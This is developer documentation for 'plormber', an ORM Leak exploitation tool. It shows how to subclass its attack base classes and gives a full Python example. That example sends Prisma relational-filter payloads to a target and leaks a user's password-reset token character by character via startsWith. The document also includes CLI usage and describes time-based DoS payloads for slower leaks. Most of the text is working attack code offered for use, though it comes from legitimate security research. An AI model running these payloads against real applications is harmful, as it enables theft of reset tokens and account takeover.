# Example Custom Blind/Error Based ORM Leak Attack

To create a custom attack, create a class that extends `plormber.attacks.base.BaseORMLeakAttack` and implement the following methods for your custom attack:

**Required**
- `create_payload`: Creates the ORM Leak payload
- `send_request`: How the ORM Leak request is sent to the target. **Use `self.request` for sending requests**.
- `was_success_result`: How to determine if a response was successful at leaking the next character.

**Optional**
- `add_options`: Add custom options for the `argparse.ArgumentParser`. **The argument names need to be the same in your `__init__` method.**
- `pre_checks`: Run any checks before attempting exploitation. Raise an `Exception` if a check fails.
- `handle_pre_check_fail`: How to handle a pre-check failure.

Below is an [example custom `plormber` attack](./examples/custom-attack/example-blind-attack.py) based on [basic relational filtering attack for `prisma`](https://www.elttam.com/blog/plormbing-your-prisma-orm/#basic-relational-filtering-attack).

```python
from argparse import ArgumentParser
from requests import Response

# Imports the base ORM Leak attack class
from plormber.attacks.base import BaseORMLeakAttack
# Imports the method for running the custom ORM Leak attack
from plormber.cli.run import run_custom_attack

class ExampleORMLeak(BaseORMLeakAttack):
    # Name of the attack
    command_name = "example-attack"
    # Description for the attack
    command_description = "Some description for the attack"

    def __init__(self, example_arg: str = '', **kwargs):
        """
            Initialises an attack instance
            Done by keyword arguments that are parsed from the command line

            Arg:
                example_arg: An example custom argument
                **kwargs: Command arguments for parent classes
        """
        # Pass off parent command arguments to the parent classes
        super().__init__(**kwargs)
        # Do stuff custom command arguments
        self.example_arg = example_arg


    @classmethod
    def add_options(cls, parser: ArgumentParser) -> ArgumentParser:
        """
            Add custom options for an attack using argparse.ArgumentParser
        """
        # Parse parent class arguments first
        parser = super().add_options(parser)

        # Add custom command arguments
        # IMPORTANT! The names of the command arguments have to be the 
        # same as the keyword arguments for __init__ 
        parser.add_argument(
            '--example-arg',
            help='An example custom argument',
            required=False,
            type=str
        )

        return parser


    def pre_checks(self):
        """
        Checks that are performed before exploitation.

        Add your checks here to verify an endpoint is vulnerable before exploiting.

        Raises:
            Exception: An exception if a pre-check failed
        """


    def handle_pre_check_fail(self, exception: Exception):
        """
        Handler for when a pre-check fails

        Args:
            exception: the raised exception
        """
        print("something goofed!")
        print(exception)


    def create_payload(self, test_value: str) -> list | dict | str:
        """
            Creates the ORM Leak payload to send to the target server

            Args:
                test_value: The string value to test if sensitive contains/starts with this value

            Returns:
                The payload to send to the target
        """
        # Example for https://www.elttam.com/blog/plormbing-your-prisma-orm/#basic-relational-filtering-attack
        payload = {
            "query": {
                "createdBy": {
                    "resetToken": {
                        "startsWith": test_value
                    }
                }
            }
        }
        return payload


    def send_request(self, payload: list | str | dict) -> Response:
        """
        How to send the request to the target instance
        IMPORTANT! Use self.request for sending requests

        Args:
            payload: The ORM Leak payload to send to the target

        Returns:
            A requests Response
        """
        # You can also do additional requests here if the ORM Leak oracle is observed in a
        # separate request than the request that sets the payload.
        #
        # A good example of this is https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6hjj-gq77-j4qw

        # Example for https://www.elttam.com/blog/plormbing-your-prisma-orm/#basic-relational-filtering-attack
        return self.request('POST', self.target, json=payload)
    

    def was_success_result(self, resp: Response) -> bool:
        """
        Checks if the response indicated a successful attempt at leaking the next character

        Args:
            resp: The response from the request testing for a character

        Returns:
            True if the response indicated a hit
        """

        # Example for https://www.elttam.com/blog/plormbing-your-prisma-orm/#basic-relational-filtering-attack
        return len(resp.json()) > 0

# Runs the custom attack
if __name__ == "__main__":
    run_custom_attack(ExampleORMLeak)
```

## Usage

```
$ python3 example-blind-attack.py example-attack --help
usage: example-blind-attack.py example-attack [-h] [--requests-options REQUESTS_OPTIONS] [--chars CHARS] [-t THREADS] [-p DUMPED_PREFIX] [--example-arg EXAMPLE_ARG]
                                              target

Some description for the attack

positional arguments:
  target                target url

options:
  -h, --help            show this help message and exit
  --requests-options REQUESTS_OPTIONS
                        additional options for requests as a JSON string (e.g. {"headers":{"cookies":"nomnom"}}) (default: {})
  --chars CHARS         character list to use in search (default: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~)
  -t THREADS, --threads THREADS
                        number of threads to use, but if doing a ORM time-based attack this would be the start number of threads threads (default: 5)
  -p DUMPED_PREFIX, --dumped-prefix DUMPED_PREFIX
                        known prefix for the dumped value (default: )
  --example-arg EXAMPLE_ARG
                        An example custom argument (default: None)
```

Using the previous example:

```
python3 example-blind-attack.py example-attack --chars '0123456789abcdef' http://127.0.0.1:9900/articles
```

---

# Example Time-based ORM Leak Attack

To create a custom time-based attack, create a class that extends `plormber.attacks.time.base.BaseTimeORMLeakAttack`. The `BaseTimeORMLeakAttack` extends the `plormber.attacks.base.BaseORMLeakAttack` class, so implement the above methods as explained in the previous section.

In addition, the `BaseTimeORMLeakAttack` requires the following methods to be implemented:

**Required**
- `build_dos_payload`: Builds the base time-based payload that would cause a time-delay when the next character is leaked.
- `add_orm_leak_payload`: Adds the leak filter to the DoS payload from `build_dos_payload`.


**Optional**
- `fit_params`: Fit parameters for performing the time-based attack. This is mainly for finding the maximum request size to cause the most significant time delay.

The [`prisma` contains attack](plormber/attacks/time/prisma/contains.py) is a good example to work from.